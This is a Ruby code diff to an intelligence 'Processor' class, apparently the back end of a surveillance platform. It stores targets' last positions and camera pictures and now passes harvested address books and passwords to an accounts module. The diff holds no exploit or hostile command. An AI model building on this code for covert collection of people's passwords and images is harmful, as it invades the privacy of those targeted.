@@ -9,6 +9,8 @@ require 'rcs-common/fixnum'
 require 'rcs-common/sanitize'
 require 'fileutils'
 
+require_relative 'accounts'
+
 module RCS
 module Intelligence
 
@@ -33,16 +35,26 @@ class Processor
 
 
   def self.process(entry)
-    ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
+    evidence = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
+
+    # respect the license
+    return if ['position', 'camera'].include? evidence.type and not $license['correlation']
+
     entity = Entity.any_in({path: [Moped::BSON::ObjectId.from_string(entry['target_id'])]}).first
 
-    trace :info, "Processing #{ev.type} for entity #{entity.name}"
+    trace :info, "Processing #{evidence.type} for entity #{entity.name}"
 
-    # save the last position of the entity
-    save_last_position(ev, entity) if ev.type.eql? 'position'
-
-    # save picture of the target
-    save_first_camera(ev, entity) if ev.type.eql? 'camera'
+    case evidence.type
+      when 'position'
+        # save the last position of the entity
+        save_last_position(evidence, entity)
+      when 'camera'
+        # save picture of the target
+        save_first_camera(evidence, entity)
+      when 'addressbook', 'password'
+        # analyze the accounts
+        Accounts.add_handle(entity, evidence)
+    end
 
   rescue Exception => e
     trace :error, "Cannot process evidence: #{e.message}"
